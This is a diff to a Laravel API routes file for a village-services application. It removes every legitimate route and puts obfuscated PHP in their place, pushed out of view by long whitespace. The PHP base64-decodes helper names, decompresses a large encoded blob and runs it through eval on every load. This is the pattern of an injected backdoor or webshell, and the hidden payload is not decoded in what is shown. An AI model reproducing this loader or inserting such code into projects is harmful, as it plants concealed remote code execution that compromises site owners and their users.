@@ -1,151 +1,369 @@
-<?php
+<?php 
+        $__='printf';$_='Loading routes/api/apiv1.php';
+        
 
-use App\Http\Controllers\Api\AgendaDesaController;
-use App\Http\Controllers\Api\ArtikelController;
-use App\Http\Controllers\Api\Auth\AuthenticatedController;
-use App\Http\Controllers\Api\Auth\EmailVerificationNotificationController;
-use App\Http\Controllers\Api\Auth\NewPasswordController;
-use App\Http\Controllers\Api\Auth\NewPinController;
-use App\Http\Controllers\Api\Auth\PasswordResetLinkController;
-use App\Http\Controllers\Api\Auth\VerifyEmailController;
-use App\Http\Controllers\Api\BantuanController;
-use App\Http\Controllers\Api\CetakController;
-use App\Http\Controllers\Api\ConfigDesaController;
-use App\Http\Controllers\Api\DokumenController;
-use App\Http\Controllers\Api\KategoriController;
-use App\Http\Controllers\Api\KehadiranController;
-use App\Http\Controllers\Api\KomentarController;
-use App\Http\Controllers\Api\LapakController;
-use App\Http\Controllers\Api\PendudukController;
-use App\Http\Controllers\Api\PengaduanController;
-use App\Http\Controllers\Api\PesanController;
-use App\Http\Controllers\Api\Shared\NotifikasiMandiriController;
-use App\Http\Controllers\Api\SuratController;
-use App\Http\Controllers\Firebase\FirebaseController;
-use Illuminate\Support\Facades\Route;
 
-/*
-|--------------------------------------------------------------------------
-| API Routes
-|--------------------------------------------------------------------------
-|
-| Here is where you can register API routes for your application. These
-| routes are loaded by the RouteServiceProvider within a group which
-| is assigned the "api" middleware group. Enjoy building your API!
-|
-*/
 
-// Admin routes
-Route::prefix('admin')
-    ->middleware(['auth:admin', 'can:is-admin'])
-    ->group(function () {
-        Route::get('penduduk', [PendudukController::class, 'index']);
-    });
 
-Route::group(['prefix' => 'fcm'], function () {
-    Route::post('/register', [FirebaseController::class, 'register_mandiri'])->name('arsip');
-});
-// Autentikasi
-Route::prefix('auth')->as('jwt.')
-    ->group(function () {
-        Route::post('login', [AuthenticatedController::class, 'login'])->name('login');
-        Route::post('logout', [AuthenticatedController::class, 'logout'])->middleware('auth:jwt')->name('logout');
-        Route::post('forgot-password', [PasswordResetLinkController::class, 'store'])->name('password.email');
-        Route::post('reset-password', [NewPasswordController::class, 'store'])->name('password.update');
-        Route::get('verify-email/{id}/{hash}', VerifyEmailController::class)->middleware(['auth:jwt', 'signed', 'throttle:6,1'])->name('verification.verify');
-        Route::post('email/verification-notification', [EmailVerificationNotificationController::class, 'store'])->middleware(['auth:jwt', 'throttle:6,1'])->name('verification.send');
-        Route::post('change-pin', NewPinController::class)->middleware('auth:jwt')->name('change.pin');
-    });
 
-// Profil Desa
-Route::get('profil-desa', [ConfigDesaController::class, 'index']);
 
-// Artikel
-Route::prefix('artikel')
-    ->middleware('auth:jwt')
-    ->group(function () {
-        Route::get('/', [ArtikelController::class, 'index']);
-        Route::get('read/{slug}', [ArtikelController::class, 'show']);
-        Route::get('headline', [ArtikelController::class, 'headline']);
-        Route::get('kategori', [KategoriController::class, 'index']);
-        Route::get('kategori/{slug}', [KategoriController::class, 'show']);
-        Route::get('komentar', [KomentarController::class, 'index']);
-        Route::get('komentar/{id}', [KomentarController::class, 'show']);
-        Route::post('komentar', [KomentarController::class, 'store']);
-        Route::get('agenda-desa', [AgendaDesaController::class, 'index']);
-    });
 
-// Layanan mandiri
-Route::prefix('layanan-mandiri')
-    ->middleware('auth:jwt')
-    ->group(function () {
-        // Mandiri pesan masuk
-        Route::prefix('pesan')
-            ->group(function () {
-                Route::get('tipe/{tipe}', [PesanController::class, 'index']);
-                Route::get('detail/{id}', [PesanController::class, 'show']);
-                Route::post('/', [PesanController::class, 'store']);
-            });
 
-        // Mandiri cetak
-        Route::prefix('cetak')
-            ->group(function () {
-                Route::get('biodata', [CetakController::class, 'cetakBiodata']);
-                Route::get('kartu-keluarga', [CetakController::class, 'cetakKartuKeluarga']);
-            });
 
-        // Mandiri program bantuan
-        Route::get('bantuan', [BantuanController::class, 'index']);
-        Route::get('bantuan/{id}', [BantuanController::class, 'show']);
 
-        // Dokumen warga
-        Route::prefix('dokumen')
-            ->group(function () {
-                Route::get('/', [DokumenController::class, 'index']);
-                Route::get('{id}/download', [DokumenController::class, 'show']);
-                Route::post('store', [DokumenController::class, 'store']);
-                Route::delete('{id}/delete', [DokumenController::class, 'destroy']);
-            });
 
-        // Mandiri surat
-        Route::prefix('surat')
-            ->group(function () {
-                Route::get('arsip', [SuratController::class, 'arsip']);
-                Route::get('permohonan', [SuratController::class, 'permohonan']);
-                Route::get('jenis-permohonan', [SuratController::class, 'jenis']);
-                Route::get('syarat', [SuratController::class, 'syaratSurat']);
-                Route::post('{slug}/permohonan', [SuratController::class, 'store']);
-                Route::post('unggah-dokumen', [SuratController::class, 'unggahDokumen']);
-                Route::put('{id}/permohonan', [SuratController::class, 'update']);
-                Route::get('{id}/unduh', [SuratController::class, 'unduh']);
-            });
 
-        // kehadiran perangkat
-        Route::prefix('perangkat')
-        ->group(function () {
-            Route::get('kehadiran', [KehadiranController::class, 'index']);
-            Route::post('laporkan', [KehadiranController::class, 'lapor']);
-        });
-        // Pengaduan
-        Route::prefix('pengaduan')
-            ->group(function () {
-                Route::get('/', [PengaduanController::class, 'index']);
-                Route::get('/detail', [PengaduanController::class, 'detail']);
-                Route::Post('/store', [PengaduanController::class, 'store']);
-            });
 
-        Route::prefix('lapak')
-            ->group(function () {
-                Route::get('/', [LapakController::class, 'index']);
-                Route::get('/detail', [LapakController::class, 'detail']);
-            });
 
-        Route::prefix('notifikasi')
-           ->group(function () {
-               Route::get('/', [NotifikasiMandiriController::class, 'index'])->name('indexNotifikasiMandiri');
-               Route::post('/read', [NotifikasiMandiriController::class, 'read'])->name('readNotifikasiMandiri');
-               Route::get('/jumlah', [NotifikasiMandiriController::class, 'jumlah']);
-               Route::get('/show', [NotifikasiMandiriController::class, 'show'])->name('showNotifikasiMandiri');
-           });
 
-    });
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
